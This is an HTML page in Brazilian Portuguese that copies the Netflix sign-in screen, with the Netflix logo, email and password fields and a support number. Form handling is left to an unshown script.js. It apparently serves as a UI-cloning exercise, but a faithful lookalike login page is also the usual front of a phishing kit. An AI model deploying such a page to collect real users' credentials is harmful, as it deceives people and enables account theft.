<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Entrar</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="antialiased">

    <header class="p-6 md:px-12">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" 
             alt="Netflix" 
             class="w-[100px] md:w-[120px]">
    </header>

    <main class="flex-grow flex flex-col justify-start px-8 pt-4 max-w-[450px] mx-auto w-full">
        <h1 class="text-[32px] font-bold leading-tight mb-1">
            Informe seus dados para entrar
        </h1>
        
        <p class="text-[#a6a6a6] text-lg mb-7">
            Ou <a href="#" class="text-white hover:underline font-medium">crie uma conta</a>.
        </p>

        <form id="loginForm" class="space-y-4">
            <div class="relative">
                <input type="text" 
                       id="email"
                       placeholder="Email ou número de celular" 
                       required
                       class="input-field w-full p-4 rounded-[4px] text-base h-[56px]">
            </div>

            <div class="relative">
                <input type="password" 
                       id="password"
                       placeholder="Senha" 
                       required
                       class="input-field w-full p-4 rounded-[4px] text-base h-[56px]">
            </div>

            <button type="submit" id="btnSubmit"
                    class="btn-netflix w-full h-[48px] rounded-[4px] text-base font-bold mt-2">
                Continuar
            </button>
        </form>

        <div class="mt-8">
            <button class="group flex items-center text-[16px] font-medium text-white hover:opacity-80 transition-opacity">
                <span>Ajuda</span>
                <svg class="w-4 h-4 ml-1 transform transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="margin-top: 2px;">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M19 9l-7 7-7-7"></path>
                </svg>
            </button>
        </div>

        <p class="recaptcha-text mt-12 leading-snug">
            Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô. 
            <a href="#" class="text-[#f1f1f1] hover:underline font-medium">Saiba mais</a>
        </p>
    </main>

    <footer class="mt-auto p-8 border-t border-[#333333] bg-black/40">
        <div class="max-w-[450px] mx-auto">
            <p class="text-[#a6a6a6] text-[15px]">
                Dúvidas? Ligue para 
                <a href="tel:08005918943" class="hover:underline">0800 591 8943</a> 
            </p>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
